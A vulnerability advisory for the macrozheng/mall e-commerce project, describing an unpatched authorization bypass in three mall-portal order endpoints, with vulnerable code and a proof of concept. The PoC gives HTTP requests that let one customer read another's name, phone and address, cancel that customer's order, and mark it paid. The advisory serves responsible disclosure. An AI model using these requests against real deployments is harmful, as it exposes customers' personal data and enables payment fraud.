https://github.com/macrozheng/mall

### Title: Horizontal IDOR in mall-portal order endpoints allows cross-member order read, cancel, and payment state manipulation

Ecosystem: maven

Package: com.macro.mall / macrozheng/mall

Affected Versions: all versions confirmed on commit 0504e86

Patched versions: None

CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N

CWE: CWE-639 -- Authorization Bypass Through User-Controlled Key
### Summary

Three mall-portal endpoints accept order IDs from the request without verifying that the order belongs to the authenticated member. Any logged-in customer can read the full details of another customer's order (including name, phone number, and shipping address), cancel that order, or mark it as paid with any payment type -- all without knowing the victim's credentials.

### Details

The portal order service (`OmsPortalOrderServiceImpl`) implements member-scoping inconsistently across its methods. Three methods query or update orders using only the caller-supplied `orderId` with no check against the authenticated member's ID:

**1. detail() -- order detail read (line 396-405):**
```java
// OmsPortalOrderServiceImpl.java
@Override
public OmsOrderDetail detail(Long orderId) {
    OmsOrder omsOrder = orderMapper.selectByPrimaryKey(orderId);  // no member check
    OmsOrderItemExample example = new OmsOrderItemExample();
    example.createCriteria().andOrderIdEqualTo(orderId);
    List<OmsOrderItem> orderItemList = orderItemMapper.selectByExample(example);
    OmsOrderDetail orderDetail = new OmsOrderDetail();
    BeanUtil.copyProperties(omsOrder, orderDetail);
    orderDetail.setOrderItemList(orderItemList);
    return orderDetail;
}
```

**2. cancelOrder() -- cross-member order cancellation (line 297-325):**
```java
@Override
public void cancelOrder(Long orderId) {
    OmsOrderExample example = new OmsOrderExample();
    example.createCriteria().andIdEqualTo(orderId).andStatusEqualTo(0).andDeleteStatusEqualTo(0);
    // no .andMemberIdEqualTo(member.getId()) -- any status=0 order is cancellable by anyone
    List<OmsOrder> cancelOrderList = orderMapper.selectByExample(example);
    ...
    cancelOrder.setStatus(4);
    orderMapper.updateByPrimaryKeySelective(cancelOrder);
}
```

**3. paySuccess() -- cross-member payment state manipulation (line 253-265):**
```java
@Override
public Integer paySuccess(Long orderId, Integer payType) {
    OmsOrder order = new OmsOrder();
    order.setId(orderId);
    order.setStatus(1);           // mark as paid
    order.setPaymentTime(new Date());
    order.setPayType(payType);
    orderMapper.updateByPrimaryKeySelective(order);  // no member check
    ...
}
```

Adjacent methods that DO check membership correctly demonstrate the fix pattern:

```java
// deleteOrder() correctly checks:
if (!member.getId().equals(order.getMemberId())) {
    Asserts.fail("不能删除他人订单！");
}

// confirmReceiveOrder() correctly checks:
if (!member.getId().equals(order.getMemberId())) {
    Asserts.fail("不能确认他人订单！");
}
```

The mall-portal module uses `AuthenticatedAuthorizationManager.authenticated()` (not the resource-based RBAC used by mall-admin), so any JWT-authenticated portal member can reach all three endpoints. The only security boundary is the service-layer ownership check -- which is missing for these three methods.

### PoC

**Prerequisites:**
- Running mall-portal (default port 8085)
- Two registered member accounts (alice and bob)

**Step 1: Register two test members**

```
GET http://localhost:8085/sso/getAuthCode?telephone=13800000001
--> authCode1

POST http://localhost:8085/sso/register
telephone=13800000001&username=alice&password=Alice%40123456&authCode=<authCode1>
--> 200 {"code":200,"message":"注册成功"}

GET http://localhost:8085/sso/getAuthCode?telephone=13800000002
--> authCode2

POST http://localhost:8085/sso/register
telephone=13800000002&username=bob&password=Bob%40123456&authCode=<authCode2>
--> 200 {"code":200,"message":"注册成功"}
```

**Step 2: Login and obtain tokens**

```
POST http://localhost:8085/sso/login
username=alice&password=Alice%40123456
--> {"data":{"token":"ALICE_TOKEN","tokenHead":"Bearer "}}

POST http://localhost:8085/sso/login
username=bob&password=Bob%40123456
--> {"data":{"token":"BOB_TOKEN","tokenHead":"Bearer "}}
```

**Step 3: Alice creates an order (order ID returned as 77 in this test)**

Alice adds a product to cart, adds a delivery address, and generates an order. The resulting order ID is 77 with memberId=12.

**Step 4: Bob reads Alice's order with his own token**

```
GET http://localhost:8085/order/detail/77
Authorization: Bearer BOB_TOKEN

HTTP/1.1 200 OK
{
    "code": 200,
    "message": "操作成功",
    "data": {
        "id": 77,
        "memberId": 12,
        "memberUsername": "alice",
        "totalAmount": 3788.0,
        "payAmount": 3699.0,
        "receiverName": "Alice",
        "receiverPhone": "13800000001",
        "receiverPostCode": "100000",
        "receiverProvince": "Beijing",
        "receiverCity": "Beijing",
        "receiverRegion": "Chaoyang",
        "receiverDetailAddress": "123 Test Street",
        "status": 0,
        ...
        "orderItemList": [...]
    }
}
```

Bob's order list returns empty (correctly scoped):
```
GET http://localhost:8085/order/list?status=-1
Authorization: Bearer BOB_TOKEN
--> {"data":{"total":0}}
```

**Step 5: Bob cancels Alice's order**

```
POST http://localhost:8085/order/cancelUserOrder?orderId=77
Authorization: Bearer BOB_TOKEN

HTTP/1.1 200 OK
{"code":200,"message":"操作成功"}
```

Database confirms: `SELECT status FROM oms_order WHERE id=77` returns `4` (cancelled).

**Step 6: Bob marks another of Alice's orders as paid (order ID 78)**

```
POST http://localhost:8085/order/paySuccess?orderId=78&payType=1
Authorization: Bearer BOB_TOKEN

HTTP/1.1 200 OK
{"code":200,"message":"支付成功","data":1}
```

Database confirms: `SELECT status, pay_type FROM oms_order WHERE id=78` returns `status=1` (paid), `pay_type=1` (Alipay).

### Impact

An authenticated mall-portal member (any registered customer) can, without knowing the victim's credentials:

1. Read any other customer's order -- exposing full name, phone number, shipping address, order items, and payment amount (PII disclosure, CWE-639).
2. Cancel any pending order belonging to another customer -- disrupting their purchase and triggering inventory release and coupon/points reversal for orders they did not own.
3. Mark any pending order as paid with any payment type -- bypassing actual payment processing, which could be used to fraudulently claim goods or to manipulate another user's order state.

The attacker needs only a valid member JWT (obtained by registering a free account) and knowledge of a victim order ID. Order IDs are sequential integers, so enumeration is straightforward.


## Disclosure
 - 3 June 2026 - reported via email
 - July - no response, created https://github.com/macrozheng/mall/issues/982
 - September - no response, issue deleted
